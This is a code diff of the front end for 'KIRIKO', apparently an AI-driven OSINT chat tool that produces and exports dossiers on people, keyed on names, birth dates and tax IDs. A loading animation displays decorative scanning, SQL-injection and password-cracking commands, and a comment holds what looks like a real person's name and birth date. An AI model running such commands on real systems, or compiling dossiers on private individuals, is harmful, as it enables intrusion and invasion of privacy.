+  } catch (err) {
+    setLoading(false);
+    const errRow = document.createElement('div');
+    errRow.className = 'msg-row asst';
+    errRow.innerHTML = `<div class="bubble asst" style="color:rgba(255,100,100,0.8)">[${t('err_conn')}] ${err.message}</div>`;
+    msgContainer.insertBefore(errRow, loadingRow);
+    scrollBottom();
+  } finally {
+    setBusy(false);
+    userInput.focus();
+  }
+}
+
+/* ══════════════════════════════════════════════════════════
+   AUTO-RESIZE TEXTAREA
+══════════════════════════════════════════════════════════ */
+function autoResize() {
+  userInput.style.height = 'auto';
+  userInput.style.height = Math.min(userInput.scrollHeight, 150) + 'px';
+}
+
+/* ══════════════════════════════════════════════════════════
+   CLEAR SESSION
+══════════════════════════════════════════════════════════ */
+function clearSession() {
+  if (!confirm(t('confirm_clear'))) return;
+  messages  = [];
+  sessionId = crypto.randomUUID(); // new session = new history slot
+  msgContainer.innerHTML = '';
+  msgContainer.appendChild(loadingRow);
+
+  const w = document.createElement('div');
+  w.id = 'welcome';
+  w.style.cssText = 'display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px;flex:1;padding:40px;text-align:center;';
+  w.innerHTML = `
+    <div class="welcome-title">KIRIKO</div>
+    <div class="welcome-sub">
+      <span class="ws-1">КАЖДЫЙ</span>
+      <span class="ws-2">ОСТАВЛЯЕТ</span>
+      <span class="ws-3">СЛЕД.</span>
+    </div>`;
+  msgContainer.insertBefore(w, loadingRow);
+}
+
+async function clearAllHistory() {
+  if (!confirm(t('confirm_clear_all'))) return;
+  await fetch('/api/history', { method: 'DELETE' });
+  // Also clear current session
+  messages  = [];
+  sessionId = crypto.randomUUID();
+  msgContainer.innerHTML = '';
+  msgContainer.appendChild(loadingRow);
+  const w = document.createElement('div');
+  w.id = 'welcome';
+  w.style.cssText = 'display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px;flex:1;padding:40px;text-align:center;';
+  w.innerHTML = `<div class="welcome-title">KIRIKO</div><div class="welcome-sub"><span class="ws-1">${t('ws1')}</span><span class="ws-2">${t('ws2')}</span><span class="ws-3">${t('ws3')}</span></div>`;
+  msgContainer.insertBefore(w, loadingRow);
+  historyModal.classList.add('hidden');
+}
+
+/* ══════════════════════════════════════════════════════════
+   DOWNLOAD HELPERS
+══════════════════════════════════════════════════════════ */
+/* Extract the last OSINT report block from messages.
+   Returns plain text of the report, or null if none found. */
+function extractReport(msgs) {
+  for (let i = msgs.length - 1; i >= 0; i--) {
+    const m = msgs[i];
+    if (m.role !== 'assistant') continue;
+    const blocks = Array.isArray(m.content) ? m.content : [];
+    const txt = blocks.filter(b => b.type === 'text').map(b => b.text).join('').trim();
+    if (txt && (txt.includes('Висновок:') || txt.includes('Соціальні зв\'язки') || txt.includes('р.н.,') || txt.includes('ІПН:'))) {
+      return txt;
+    }
+  }
+  return null;
+}
+
+/* Build a clean A4 report HTML — Times New Roman 14pt bold justified (matches original DOCX) */
+function buildReportHTML(reportText, personName) {
+  const date = new Date().toLocaleDateString('uk', { day: '2-digit', month: '2-digit', year: 'numeric' });
+  const lines = reportText.split('\n');
+  let body = '';
+  for (const line of lines) {
+    const safe = escapeHtml(line);
+    if (safe.trim() === '') {
+      body += '<p class="empty">&nbsp;</p>';
+    } else {
+      body += `<p>${safe}</p>`;
+    }
+  }
+  return `<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <title>OSINT — ${escapeHtml(personName || 'звіт')}</title>
+  <style>
+    @page {
+      size: A4;
+      margin: 2.5cm 2.5cm 2.5cm 3cm;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Times New Roman', Times, serif;
+      font-size: 14pt;
+      font-weight: bold;
+      color: #000;
+      background: #fff;
+      line-height: 1.18;
+    }
+    .page {
+      max-width: 210mm;
+      margin: 0 auto;
+      padding: 2.5cm 2.5cm 2.5cm 3cm;
+    }
+    p {
+      text-align: justify;
+      margin-top: 1.4pt;
+      margin-bottom: 1.4pt;
+      font-family: 'Times New Roman', Times, serif;
+      font-size: 14pt;
+      font-weight: bold;
+    }
+    p.empty {
+      margin-top: 4pt;
+      margin-bottom: 4pt;
+    }
+    @media print {
+      .page { padding: 0; margin: 0; max-width: none; }
+      body { background: #fff; }
+    }
+  </style>
+</head>
+<body>
+<div class="page">
+${body}
+</div>
+</body>
+</html>`;
+}
+
+/* Dark-theme conversation export (for TXT fallback reference) */
+function buildConvHTML(msgs, title) {
+  const date = new Date().toLocaleString('ru');
+  // Try to extract just the OSINT report for clean output
+  const reportText = extractReport(msgs);
+  if (reportText) {
+    const firstLine = reportText.split('\n').find(l => l.trim()) || title;
+    return buildReportHTML(reportText, firstLine.slice(0, 60));
+  }
+  // Fallback: full conversation
+  let body = '';
+  for (const m of msgs) {
+    if (m.role === 'user' && typeof m.content === 'string') {
+      body += `<div class="msg user"><div class="label">${t('label_you')}</div><div class="text">${escapeHtml(m.content)}</div></div>`;
+    } else if (m.role === 'assistant') {
+      const blocks = Array.isArray(m.content) ? m.content : [];
+      const txt = blocks.filter(b => b.type === 'text').map(b => b.text).join('');
+      if (txt.trim())
+        body += `<div class="msg asst"><div class="label">◀ KIRIKO</div><div class="text">${escapeHtml(txt)}</div></div>`;
+    }
+  }
+  return `<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8">
+<title>KIRIKO — ${escapeHtml(title)}</title>
+<style>
+  body{background:#030a03;color:#a0ffb0;font-family:'Courier New',monospace;font-size:14px;padding:40px;max-width:860px;margin:0 auto;}
+  h1{color:#00ff41;font-size:18px;letter-spacing:.3em;margin-bottom:4px;}
+  .meta{color:rgba(0,255,65,.35);font-size:10px;letter-spacing:.15em;margin-bottom:32px;}
+  .msg{margin-bottom:20px;padding:14px 18px;border-radius:6px;}
+  .msg.user{background:#071207;border:1px solid rgba(0,255,65,.12);}
+  .msg.asst{background:#040d04;border:1px solid rgba(0,255,65,.09);}
+  .label{font-size:9px;letter-spacing:.3em;color:rgba(0,255,65,.45);margin-bottom:7px;}
+  .text{line-height:1.7;white-space:pre-wrap;}
+  @media print{body{background:#fff;color:#111;}h1,.label{color:#333;}.msg.user,.msg.asst{background:#f5f5f5;border:1px solid #ccc;}}
+</style></head><body>
+<h1>KIRIKO</h1><div class="meta">${date}</div>
+${body}
+</body></html>`;
+}
+
+function buildConvTXT(msgs, title) {
+  // Try to extract just the OSINT report
+  const reportText = extractReport(msgs);
+  if (reportText) return reportText;
+  // Fallback: full conversation
+  const date = new Date().toLocaleString('ru');
+  let txt = `KIRIKO OSINT Report\n${date}\n${'─'.repeat(60)}\n\n`;
+  for (const m of msgs) {
+    if (m.role === 'user' && typeof m.content === 'string')
+      txt += `${t('label_you')}:\n${m.content}\n\n`;
+    else if (m.role === 'assistant') {
+      const blocks = Array.isArray(m.content) ? m.content : [];
+      const t = blocks.filter(b => b.type === 'text').map(b => b.text).join('');
+      if (t.trim()) txt += `◀ KIRIKO:\n${t}\n\n`;
+    }
+  }
+  return txt;
+}
+
+function escapeHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function triggerDownload(content, filename, mime) {
+  const blob = new Blob([content], { type: mime + ';charset=utf-8' });
+  const url  = URL.createObjectURL(blob);
+  const a    = document.createElement('a');
+  a.href = url; a.download = filename; a.click();
+  URL.revokeObjectURL(url);
+}
+
+function downloadMsgs(msgs, format) {
+  // Try to get person name from first line of report for filename
+  const reportText = extractReport(msgs);
+  let baseName = 'osint-report';
+  if (reportText) {
+    const firstLine = reportText.split('\n').find(l => l.trim()) || '';
+    // e.g. "Пулишій Віталій Якович, 04.03.2002 р.н., 24 роки"
+    const namePart = firstLine.split(',')[0].trim().replace(/\s+/g, '_');
+    if (namePart.length > 2) baseName = namePart;
+  } else {
+    const title = msgs.find(m => m.role === 'user' && typeof m.content === 'string')?.content?.slice(0, 40) || 'report';
+    baseName = title.replace(/[^a-zA-Zа-яА-ЯіІєЄ\d]/g, '_').slice(0, 40);
+  }
+  if (format === 'docx') {
+    // Server-side DOCX generation
+    const reportText = extractReport(msgs) || buildConvTXT(msgs, baseName);
+    fetch('/api/export/docx', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ text: reportText }),
+    })
+    .then(r => {
+      if (!r.ok) throw new Error('server error');
+      return r.blob();
+    })
+    .then(blob => {
+      const url = URL.createObjectURL(blob);
+      const a   = document.createElement('a');
+      a.href = url;
+      a.download = `${baseName}.docx`;
+      a.click();
+      URL.revokeObjectURL(url);
+    })
+    .catch(err => console.error('DOCX export failed:', err));
+
+  } else if (format === 'html') {
+    const html = buildConvHTML(msgs, baseName);
+    triggerDownload(html, `${baseName}.html`, 'text/html');
+
+  } else if (format === 'pdf') {
+    const w = window.open('', '_blank');
+    w.document.write(buildConvHTML(msgs, baseName));
+    w.document.close();
+    w.focus();
+    setTimeout(() => { w.print(); }, 800);
+  }
+}
+
+/* ══════════════════════════════════════════════════════════
+   HISTORY MODAL
+══════════════════════════════════════════════════════════ */
+const historyModal = document.getElementById('history-modal');
+const historyList  = document.getElementById('history-list');
+
+async function openHistory() {
+  historyModal.classList.remove('hidden');
+  historyList.innerHTML = `<div class="hist-empty">${t('hist_loading')}</div>`;
+
+  try {
+    const data = await fetch('/api/history').then(r => r.json());
+    if (!data.length) {
+      historyList.innerHTML = `<div class="hist-empty">${t('hist_empty')}</div>`;
+      return;
+    }
+    historyList.innerHTML = '';
+    for (const item of data) {
+      const date = item.timestamp
+        ? new Date(item.timestamp).toLocaleString('ru', { day:'2-digit', month:'2-digit', year:'2-digit', hour:'2-digit', minute:'2-digit' })
+        : '';
+      const el = document.createElement('div');
+      el.className = 'hist-item';
+      el.innerHTML = `
+        <div class="hist-meta" data-id="${item.id}">
+          <div class="hist-title">${escapeHtml(item.title)}</div>
+          <div class="hist-date">${date} &nbsp;·&nbsp; ${item.msg_count || 0} ${t('hist_msgs')}</div>
+        </div>
+        <div class="hist-actions">
+          <span class="hist-btn dl-d" data-id="${item.id}">docx</span>
+          <span class="hist-btn dl-p" data-id="${item.id}">pdf</span>
+          <span class="hist-btn dl-h" data-id="${item.id}">html</span>
+          <span class="hist-btn del" data-id="${item.id}">${t('hist_delete')}</span>
+        </div>`;
+
+      // Load into chat
+      el.querySelector('.hist-meta').addEventListener('click', async () => {
+        const full = await fetch(`/api/history/${item.id}`).then(r => r.json());
+        if (full.messages) {
+          sessionId = crypto.randomUUID();
+          renderConversation(full.messages);
+          historyModal.classList.add('hidden');
+        }
+      });
+
+      // Download HTML
+      el.querySelector('.dl-h').addEventListener('click', async (e) => {
+        e.stopPropagation();
+        const full = await fetch(`/api/history/${item.id}`).then(r => r.json());
+        if (full.messages) downloadMsgs(full.messages, 'html');
+      });
+      // Download DOCX
+      el.querySelector('.dl-d').addEventListener('click', async (e) => {
+        e.stopPropagation();
+        const full = await fetch(`/api/history/${item.id}`).then(r => r.json());
+        if (full.messages) downloadMsgs(full.messages, 'docx');
+      });
+      // Download PDF
+      el.querySelector('.dl-p').addEventListener('click', async (e) => {
+        e.stopPropagation();
+        const full = await fetch(`/api/history/${item.id}`).then(r => r.json());
+        if (full.messages) downloadMsgs(full.messages, 'pdf');
+      });
+      // Delete
+      el.querySelector('.del').addEventListener('click', async (e) => {
+        e.stopPropagation();
+        if (!confirm(t('confirm_delete'))) return;
+        await fetch(`/api/history/${item.id}`, { method: 'DELETE' });
+        el.remove();
+        if (!historyList.querySelector('.hist-item'))
+          historyList.innerHTML = `<div class="hist-empty">${t('hist_empty')}</div>`;
+      });
+
+      historyList.appendChild(el);
+    }
+  } catch {
+    historyList.innerHTML = `<div class="hist-empty">${t('hist_err')}</div>`;
+  }
+}
+
+document.getElementById('history-btn').addEventListener('click', openHistory);
+document.getElementById('history-close').addEventListener('click', () => historyModal.classList.add('hidden'));
+document.getElementById('clear-all-btn').addEventListener('click', clearAllHistory);
+historyModal.addEventListener('click', e => { if (e.target === historyModal) historyModal.classList.add('hidden'); });
+
+/* ══════════════════════════════════════════════════════════
+   DOWNLOAD MODAL (current session)
+══════════════════════════════════════════════════════════ */
+const downloadModal = document.getElementById('download-modal');
+const dlBody        = document.getElementById('dl-body');
+
+document.getElementById('download-btn').addEventListener('click', () => {
+  downloadModal.classList.remove('hidden');
+
+  if (!messages.length) {
+    dlBody.innerHTML = `<div class="dl-empty">${t('dl_no_msgs')}</div>`;
+    return;
+  }
+
+  dlBody.innerHTML = `
+    <div class="dl-options">
+      <div class="dl-opt" data-fmt="docx">
+        <span class="dl-opt-label">Word</span>
+        <span class="dl-opt-ext">.docx</span>
+      </div>
+      <div class="dl-opt" data-fmt="pdf">
+        <span class="dl-opt-label">PDF</span>
+        <span class="dl-opt-ext">${t('dl_pdf')}</span>
+      </div>
+      <div class="dl-opt" data-fmt="html">
+        <span class="dl-opt-label">HTML</span>
+        <span class="dl-opt-ext">.html</span>
+      </div>
+    </div>
+    <div class="dl-note">${t('dl_note')}</div>`;
+
+  dlBody.querySelectorAll('.dl-opt').forEach(el => {
+    el.addEventListener('click', () => {
+      downloadMsgs(messages, el.dataset.fmt);
+      downloadModal.classList.add('hidden');
+    });
+  });
+});
+
+document.getElementById('download-close').addEventListener('click', () => downloadModal.classList.add('hidden'));
+downloadModal.addEventListener('click', e => { if (e.target === downloadModal) downloadModal.classList.add('hidden'); });
+
+/* ══════════════════════════════════════════════════════════
+   EVENT LISTENERS
+══════════════════════════════════════════════════════════ */
+sendBtn.addEventListener('click', sendMessage);
+userInput.addEventListener('keydown', e => {
+  if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendMessage(); }
+});
+userInput.addEventListener('input', autoResize);
+clearBtn.addEventListener('click', clearSession);
+
+document.getElementById('logout-btn').addEventListener('click', () => {
+  window.location.href = '/logout';
+});
+
+userInput.focus();
+
+/* ══════════════════════════════════════════════════════════
+   HACKER TERMINAL — loading animation
+══════════════════════════════════════════════════════════ */
+(function() {
+  const linesEl = document.getElementById('hack-lines');
+  const cmdEl   = document.getElementById('hi-cmd');
+  const pidEl   = document.getElementById('hth-pid');
+  if (!linesEl || !cmdEl) return;
+
+  // Live PID ticker — skip when terminal hidden
+  if (pidEl) setInterval(() => {
+    if (!loadingRow.classList.contains('visible')) return;
+    pidEl.textContent = 'PID: ' + (Math.floor(Math.random()*64000+1000));
+  }, 2600);
+
+  // Commands to "type"
+  const SCRIPTS = [
+    './nemezida.py --ipn {hex} --depth=full --out=json',
+    'python3 sherlock.py --nsfw --timeout=20 {word} --proxy socks5://127.0.0.1:9050',
+    'fanstatistik --id {hex} --mode=scrape --proxy=auto',
+    'python3 thundertrace.py --username {word} --sites=all --verbose',
+    'curl -sS "https://api.osint.kiriko/v3/resolve" -d "ipn={hex}&scope=full"',
+    'nmap -sV -sC -p- --open -T4 {ip} -oN recon_{hex}.txt',
+    'masscan {ip}/24 -p1-65535 --rate=2000 --router-mac auto',
+    'gobuster dir -u https://{ip} -w seclists/Discovery/Web-Content/raft-large.txt -t 40',
+    'sqlmap -u "https://{ip}/api?id={hex}" --dbs --batch --level=3',
+    'tshark -i eth0 -f "host {ip}" -w capture_{hex}.pcap -a duration:30',
+    'john --format=bcrypt --wordlist=rockyou.txt hash_{hex}.txt --pot=cracked.pot',
+    'openssl s_client -connect {ip}:443 2>/dev/null | openssl x509 -noout -text',
+    'python3 recon-ng -w kiriko -m recon/profiles-profiles/profiler -o SOURCE={word}',
+    'whois {ip} | grep -E "^(org|netname|country|abuse)" --color=never',
+    'nuclei -u https://{ip} -t cves/ -t exposures/ -severity critical,high -silent',
+  ];
+
+  // Result lines
+  const RESULTS = [
+    { t:'ok',  msg:'профіль ідентифіковано',        val: () => Math.floor(Math.random()*12+3)+' акаунтів' },
+    { t:'inf', msg:'запит до реєстру ідентичності', val: null },
+    { t:'ok',  msg:'номер телефону знайдено',        val: () => '+380'+Math.floor(Math.random()*900000000+100000000) },
+    { t:'err', msg:'Cloudflare — зміна вузла',       val: null },
+    { t:'ok',  msg:'соціальний граф побудовано',     bar: () => Math.floor(Math.random()*15+82) },
+    { t:'inf', msg:'перехресна перевірка leak-db',   val: null },
+    { t:'ok',  msg:'хеш розкрито',                   val: () => '0x'+rHex(8) },
+    { t:'err', msg:'rate limit — ротація проксі',    val: null },
+    { t:'ok',  msg:'відкритий порт',                 val: () => [22,80,443,3306,5432,8080,8443][Math.floor(Math.random()*7)]+'/tcp' },
+    { t:'inf', msg:'перебір піддоменів...',           val: null },
+    { t:'ok',  msg:'збіг облікових даних',           bar: () => Math.floor(Math.random()*10+88) },
+    { t:'inf', msg:'побудова мережі контактів',      val: null },
+    { t:'ok',  msg:'геолокація визначена',            val: () => ['Київ','Харків','Львів','Дніпро','Одеса','Запоріжжя'][Math.floor(Math.random()*6)] },
+    { t:'err', msg:'таймаут — активовано failover',  val: null },
+    { t:'ok',  msg:'сертифікат розпарсено',           val: () => 'SHA-256/RSA-'+[2048,4096][Math.floor(Math.random()*2)] },
+    { t:'ok',  msg:'записів витягнуто',               val: () => Math.floor(Math.random()*800+50)+' records' },
+    { t:'inf', msg:'компіляція досьє...',             val: null },
+    { t:'ok',  msg:'модуль завершено',                bar: () => 100 },
+  ];
+
+  function rHex(n) { return Math.floor(Math.random()*Math.pow(16,n)).toString(16).toUpperCase().padStart(n,'0'); }
+  function rWord(){ const w=['ivanov_d','kovalenko','petrenko_v','shevchuk','bondarenko','melnyk','kravchenko','sydorenko']; return w[Math.floor(Math.random()*w.length)]; }
+  function rIP()  { return `${Math.floor(Math.random()*128+10)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254+1)}`; }
+  function rTs()  { const d=new Date(); return `${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}`; }
+
+  function makeBar(pct) {
+    const total=10, filled=Math.round(pct/100*total), empty=total-filled;
+    return `<span class="hl-bar">${'█'.repeat(filled)}</span><span class="hl-bare">${'░'.repeat(empty)}</span> <span class="hl-val">${pct}%</span>`;
+  }
+
+  function addLine(r) {
+    const div = document.createElement('div');
+    div.className = 'hl';
+    const tc = r.t==='ok'?'hl-ok' : r.t==='err'?'hl-err' : 'hl-inf';
+    const tg = r.t==='ok'?'[+]'  : r.t==='err'?'[!]'    : '[*]';
+    let extra = '';
+    if (r.bar)      extra = '  ' + makeBar(r.bar());
+    else if (r.val) extra = `  <span class="hl-val">${r.val()}</span>`;
+    div.innerHTML = `<span class="hl-ts">[${rTs()}]</span> <span class="${tc}">${tg}</span> <span class="hl-txt">${r.msg}</span>${extra}`;
+    linesEl.appendChild(div);
+    // Keep max 5 lines — remove immediately, no opacity transition (no compositor layer)
+    while (linesEl.children.length > 5) linesEl.removeChild(linesEl.children[0]);
+  }
+
+  function pickScript() {
+    const tpl = SCRIPTS[Math.floor(Math.random()*SCRIPTS.length)];
+    return tpl.replace('{hex}', '0x'+rHex(4)).replace('{word}', rWord()).replace('{ip}', rIP());
+  }
+
+  let resIdx = Math.floor(Math.random()*RESULTS.length);
+  let phase='type', pos=0, cmd='', _tickRunning=false;
+
+  function tick() {
+    // Stop when loading-row hidden — MutationObserver restarts on next query
+    if (!loadingRow.classList.contains('visible')) {
+      _tickRunning = false;
+      cmdEl.textContent = '';
+      return;
+    }
+    if (phase === 'type') {
+      if (pos === 0) cmd = pickScript();
+      pos++;
+      cmdEl.textContent = cmd.slice(0, pos);
+      if (pos >= cmd.length) { phase='run'; pos=0; setTimeout(tick, 500+Math.random()*400); return; }
+      setTimeout(tick, 28+Math.random()*22);
+    } else {
+      addLine(RESULTS[resIdx % RESULTS.length]);
+      resIdx++;
+      cmdEl.textContent = '';
+      phase = 'type';
+      setTimeout(tick, 250+Math.random()*250);
+    }
+  }
+
+  // Background async lines
+  setInterval(() => {
+    if (!document.getElementById('loading-row').classList.contains('visible')) return;
+    const bg = [
+      { t:'inf', msg:'keepalive',          val: () => Math.floor(Math.random()*80+4)+'ms' },
+      { t:'ok',  msg:'proxy chain alive',  val: () => rIP() },
+      { t:'inf', msg:'tor circuit rotate', val: null },
+      { t:'ok',  msg:'dns cache hit',      val: null },
+      { t:'inf', msg:'stream buffer',      val: () => Math.floor(Math.random()*400+20)+' KB' },
+    ];
+    addLine(bg[Math.floor(Math.random()*bg.length)]);
+  }, 4800);
+
+  // Start tick only when loading-row becomes visible; stop when hidden
+  new MutationObserver(() => {
+    if (loadingRow.classList.contains('visible') && !_tickRunning) {
+      _tickRunning = true;
+      phase = 'type'; pos = 0;
+      setTimeout(tick, 80);
+    }
+  }).observe(loadingRow, { attributes: true, attributeFilter: ['class'] });
+})();
+
+
+/* char counter + per-line syntax highlight */
+(function() {
+  const inp    = document.getElementById('user-input');
+  const charEl = document.getElementById('char-out');
+  const hlDiv  = document.getElementById('input-highlight');
+  if (!inp || !charEl || !hlDiv) return;
+
+  const DATA_RE = [
+    /\d{2}[.\/\-]\d{2}[.\/\-]\d{4}/,
+    /\d{4}[.\/\-]\d{2}[.\/\-]\d{2}/,
+    /\+?[78][\s\-]?\(?\d{3}\)?[\s\-]?\d{3}[\s\-]?\d{2}[\s\-]?\d{2}/,
+    /\+?380[\s\-]?\d{2}[\s\-]?\d{3}[\s\-]?\d{4}/,
+    /\b\d{10}\b|\b\d{12}\b/,
+    /[А-ЯЁ][а-яё]+\s+[А-ЯЁ][а-яё]+\s+[А-ЯЁ][а-яё]{3,}/,
+    /[A-Z][a-z]+\s+[A-Z][a-z]+\s+[A-Z][a-z]{3,}/,
+  ];
+
+  function esc(s) {
+    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
+  let _focused = false;
+
+  function updateHL() {
+    const val   = inp.value;
+    const cur   = _focused ? inp.selectionStart : -1;
+    const lines = val.split('\n');
+    let charCount = 0;
+    hlDiv.innerHTML = lines.map(line => {
+      const lineStart = charCount;
+      const lineEnd   = lineStart + line.length;
+      const cls = DATA_RE.some(re => re.test(line)) ? 'data-line' : 'cmd-line';
+      let html;
+      if (cur >= lineStart && cur <= lineEnd) {
+        const lp = cur - lineStart;
+        html = `<div class="${cls}">${esc(line.slice(0,lp))}<span class="fake-caret">&#x25AE;</span>${esc(line.slice(lp))}</div>`;
+      } else {
+        html = `<div class="${cls}">${esc(line) || ' '}</div>`;
+      }
+      charCount += line.length + 1;
+      return html;
+    }).join('');
+    hlDiv.scrollTop = inp.scrollTop;
+  }
+
+  inp.addEventListener('focus',   () => { _focused = true;  updateHL(); });
+  inp.addEventListener('blur',    () => { _focused = false; updateHL(); });
+  if (document.activeElement === inp) { _focused = true; }
+  inp.addEventListener('input',   () => {
+    charEl.textContent = inp.value.length ? inp.value.length + ' CHR' : '0 CHR';
+    updateHL();
+  });
+  inp.addEventListener('keyup',   updateHL);
+  inp.addEventListener('mouseup', updateHL);
+  inp.addEventListener('scroll',  () => { hlDiv.scrollTop = inp.scrollTop; });
+
+  updateHL();
+})();
+
+/* ═════════════════════════════════════════════════════════
+   HORROR GLITCH — .welcome-title (внутренний интерфейс)
+   3 типа: crash-tear | screen-rip | flicker-out
+   ~2.2 с цикл. Сам останавливается если welcome убран,
+   сам возобновляется если welcome снова появился.
+   ═════════════════════════════════════════════════════════ */
+(function() {
+  let active = false;
+
+  function rnd(a, b) { return a + Math.random() * (b - a); }
+  function ri(a, b)  { return (rnd(a, b)) | 0; }
+
+  function set(el, s) {
+    el.style.transition = 'none';
+    el.style.transform  = s.transform  || '';
+    el.style.opacity    = s.opacity    !== undefined ? String(s.opacity) : '';
+    el.style.filter     = s.filter     || '';
+    el.style.clipPath   = s.clipPath   || '';
+  }
+
+  function clear(el, done) {
+    el.style.transform  = '';
+    el.style.opacity    = '';
+    el.style.filter     = '';
+    el.style.clipPath   = '';
+    el.style.transition = '';
+    active = false;
+    done();
+  }
+
+  /* ── crash-tear: резкий сдвиг влево + восстановление ── */
+  function crashTear(el, done) {
+    function art(dx) {
+      return `drop-shadow(${-dx}px 0 rgba(255,0,60,.96)) drop-shadow(${dx}px 0 rgba(0,255,249,.96))`;
+    }
+    const seq = [
+      { transform:`translate(-22px,${ri(-3,4)}px) skewX(-22deg)`, opacity:.04,  filter:art(22), clipPath:`inset(0 0 ${ri(60,80)}% 0)` },
+      { transform:`translate(20px,${ri(-2,3)}px)  skewX(15deg)`,  opacity:.82,  filter:art(14), clipPath:`inset(${ri(15,28)}% 0 ${ri(42,58)}% 0)` },
+      { transform:`translate(-12px,1px) skewX(-7deg)`,             opacity:.55,  filter:art(8),  clipPath:`inset(${ri(40,55)}% 0 ${ri(18,32)}% 0)` },
+      { transform:`translate(6px,0)     skewX(3deg)`,              opacity:.90,  filter:art(4),  clipPath:'none' },
+    ];
+    let i = 0;
+    (function step() {
+      if (!document.contains(el)) { active = false; return; }
+      if (i >= seq.length) { clear(el, done); return; }
+      set(el, seq[i++]);
+      setTimeout(step, ri(28, 58));
+    })();
+  }
+
+  /* ── screen-rip: 5 горизонтальных полос на разных X ── */
+  function screenRip(el, done) {
+    const art = 'drop-shadow(-20px 0 rgba(255,0,60,.92)) drop-shadow(20px 0 rgba(0,255,249,.92))';
+    const slices = [
+      { clipPath:'inset(0 0 82% 0)',    transform:`translate(${ri(-20,20)}px,0) skewX(${ri(-6,6)}deg)` },
+      { clipPath:'inset(18% 0 65% 0)', transform:`translate(${ri(-22,22)}px,0) skewX(${ri(-9,9)}deg)` },
+      { clipPath:'inset(36% 0 47% 0)', transform:`translate(${ri(-16,16)}px,0) skewX(${ri(-5,5)}deg)` },
+      { clipPath:'inset(53% 0 31% 0)', transform:`translate(${ri(-18,18)}px,0) skewX(${ri(-7,7)}deg)` },
+      { clipPath:'inset(70% 0 13% 0)', transform:`translate(${ri(-12,12)}px,0) skewX(${ri(-4,4)}deg)` },
+    ];
+    let i = 0;
+    (function step() {
+      if (!document.contains(el)) { active = false; return; }
+      if (i >= slices.length) { clear(el, done); return; }
+      const s = slices[i++];
+      set(el, { transform: s.transform, clipPath: s.clipPath, opacity: rnd(.06, .88), filter: art });
+      setTimeout(step, ri(22, 52));
+    })();
+  }
+
+  /* ── flicker-out: мигание + хаотичный сдвиг ── */
+  function flickerOut(el, done) {
+    const ticks = ri(6, 11);
+    let i = 0;
+    (function step() {
+      if (!document.contains(el)) { active = false; return; }
+      if (i >= ticks) { clear(el, done); return; }
+      const even = (i & 1) === 0;
+      const dx   = ri(-22, 22);
+      set(el, {
+        transform: `translate(${ri(-8,8)}px,${ri(-3,3)}px) skewX(${ri(-12,12)}deg)`,
+        opacity:   even ? rnd(.04, .12) : rnd(.78, 1.0),
+        filter:    `drop-shadow(${dx}px 0 rgba(255,0,60,${rnd(.65,1).toFixed(2)})) ` +
+                   `drop-shadow(${-dx}px 0 rgba(0,255,249,${rnd(.65,1).toFixed(2)}))`,
+        clipPath:  (i === 0) ? `inset(${ri(20,44)}% 0 ${ri(20,44)}% 0)` : 'none',
+      });
+      i++;
+      setTimeout(step, ri(35, 75));
+    })();
+  }
+
+  const BURSTS = [crashTear, screenRip, flickerOut];
+
+  function loop() {
+    if (active) return;
+    /* Перезапрашиваем каждый раз — находит новый элемент если welcome пересоздали */
+    const el = document.querySelector('.welcome-title');
+    if (!el || !document.contains(el)) {
+      setTimeout(loop, 800);   /* welcome скрыт — проверим позже */
+      return;
+    }
+    active = true;
+    BURSTS[ri(0, BURSTS.length)](el, () => {
+      setTimeout(loop, ri(1400, 3000));  /* ~2 200 мс в среднем */
+    });
+  }
+
+  /* Дать странице загрузиться полностью */
+  setTimeout(loop, 1200);
+})();
+
+/* ═════════════════════════════════════════════════════════
+   HORROR GLITCH — .ws-3 (слово СЛЕД / СЛІД / TRACE)
+   Независимый цикл, десинхронизирован с KIRIKO-глитчем.
+   ═════════════════════════════════════════════════════════ */
+(function() {
+  let active = false;
+
+  function rnd(a, b) { return a + Math.random() * (b - a); }
+  function ri(a, b)  { return (rnd(a, b)) | 0; }
+
+  function set(el, s) {
+    el.style.transition = 'none';
+    el.style.transform  = s.transform  || '';
+    el.style.opacity    = s.opacity    !== undefined ? String(s.opacity) : '';
+    el.style.filter     = s.filter     || '';
+    el.style.clipPath   = s.clipPath   || '';
+  }
+
+  function clear(el, done) {
+    el.style.transform  = '';
+    el.style.opacity    = '';
+    el.style.filter     = '';
+    el.style.clipPath   = '';
+    el.style.transition = '';
+    active = false;
+    done();
+  }
+
+  /* Красный артефакт — красный доминирует, меньше циана */
+  function art(dx) {
+    return `drop-shadow(${-dx}px 0 rgba(255,0,40,.98)) drop-shadow(${dx}px 0 rgba(0,255,249,.65))`;
+  }
+
+  function crashTear(el, done) {
+    const seq = [
+      { transform:`translate(-22px,${ri(-3,4)}px) skewX(-22deg)`, opacity:.04,  filter:art(22), clipPath:`inset(0 0 ${ri(55,80)}% 0)` },
+      { transform:`translate(20px,${ri(-2,3)}px)  skewX(15deg)`,  opacity:.78,  filter:art(14), clipPath:`inset(${ri(15,30)}% 0 ${ri(40,58)}% 0)` },
+      { transform:`translate(-10px,1px) skewX(-7deg)`,             opacity:.52,  filter:art(8),  clipPath:`inset(${ri(42,56)}% 0 ${ri(16,30)}% 0)` },
+      { transform:`translate(5px,0)     skewX(3deg)`,              opacity:.90,  filter:art(3),  clipPath:'none' },
+    ];
+    let i = 0;
+    (function step() {
+      if (!document.contains(el)) { active = false; return; }
+      if (i >= seq.length) { clear(el, done); return; }
+      set(el, seq[i++]);
+      setTimeout(step, ri(30, 62));
+    })();
+  }
+
+  function screenRip(el, done) {
+    const a = art(18);
+    const slices = [
+      { clipPath:'inset(0 0 80% 0)',    transform:`translate(${ri(-20,20)}px,0) skewX(${ri(-8,8)}deg)` },
